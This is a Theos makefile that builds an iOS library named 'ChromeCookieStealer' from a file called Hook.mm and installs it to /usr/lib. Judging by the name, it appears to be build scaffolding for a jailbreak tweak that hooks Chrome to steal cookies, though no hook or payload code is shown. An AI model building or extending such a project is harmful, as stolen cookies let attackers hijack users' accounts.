ARCHS = arm64 arm64e
TARGET = iphone:clang:latest:15.0

include $(THEOS)/makefiles/common.mk

LIBRARY_NAME = ChromeCookieStealer
ChromeCookieStealer_FILES = Hook.mm
ChromeCookieStealer_FRAMEWORKS = UIKit WebKit Foundation
ChromeCookieStealer_CFLAGS = -fobjc-arc
ChromeCookieStealer_INSTALL_PATH = /usr/lib

include $(THEOS)/makefiles/library.mk
